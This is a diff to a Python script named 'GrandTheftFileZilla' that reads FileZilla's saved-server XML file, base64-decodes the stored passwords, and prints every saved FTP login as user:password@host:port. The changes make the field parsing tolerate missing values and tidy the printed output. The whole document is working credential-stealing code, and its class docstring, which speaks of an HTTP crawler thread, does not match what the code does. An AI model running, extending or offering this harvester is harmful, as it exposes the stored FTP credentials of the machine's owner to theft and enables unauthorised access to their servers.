@@ -27,8 +27,6 @@ import base64
 import sys
 import os
 
-print()
-
 class GrandTheftFileZilla:
     """The crawler thread executes the HTTP request using the HTTP handler.
 
@@ -67,12 +65,17 @@ class GrandTheftFileZilla:
 
         """
         root = xml.etree.ElementTree.parse(location).getroot()
-        for server in root[0].findall('Server'):
+        for server in root[0].findall("Server"):
+            usernm = server.find("User").text if hasattr(server.find("User"), "text") else ""
+            passwd = server.find("Pass").text if hasattr(server.find("Pass"), "text") else ""
+            hostnm = server.find("Host").text if hasattr(server.find("Host"), "text") else ""
+            portnb = server.find("Port").text if hasattr(server.find("Port"), "text") else ""
+
             self.__credentials.append((
-                server.find('User').text,
-                base64.b64decode(server.find('Pass').text).decode('utf-8'),
-                server.find('Host').text,
-                server.find('Port').text
+                usernm,
+                base64.b64decode(passwd).decode("utf-8"),
+                hostnm,
+                portnb
             ))
 
     def get_credentials(self):
@@ -92,4 +95,14 @@ if __name__ == "__main__":
     credentials = GrandTheftFileZilla().get_credentials()
 
     for (usernm, passwd, hostnm, portnb) in credentials:
-        print(usernm + ":" + passwd + "@" + hostnm + ":" + portnb)
+        credential = usernm
+
+        if len(passwd):
+            credential += ":" + passwd
+
+        credential += "@" + hostnm
+
+        if len(portnb):
+            credential += ":" + portnb
+
+        print(credential)
